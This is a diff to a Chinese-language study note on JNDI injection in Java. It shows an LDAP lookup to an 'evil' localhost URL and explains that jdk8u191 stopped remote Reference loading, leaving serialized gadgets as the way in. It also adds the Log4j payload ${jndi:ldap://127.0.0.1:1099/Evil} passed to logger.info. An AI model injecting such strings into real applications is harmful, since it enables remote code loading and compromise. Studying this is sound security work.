@@ -18,4 +18,11 @@ public static void main(String[] args) throws NamingException {
     context.lookup( "ldap://127.0.0.1:10997/evil");
 }
 ```
-从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
+从jdk 8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
+
+^
+## **log4j的JNDI注入**
+```
+logger.info("${jndi:ldap://127.0.0.1:1099/Evil}");
+```
+使用${jndi:}后，底层使用了new InitialContext().lookup()。
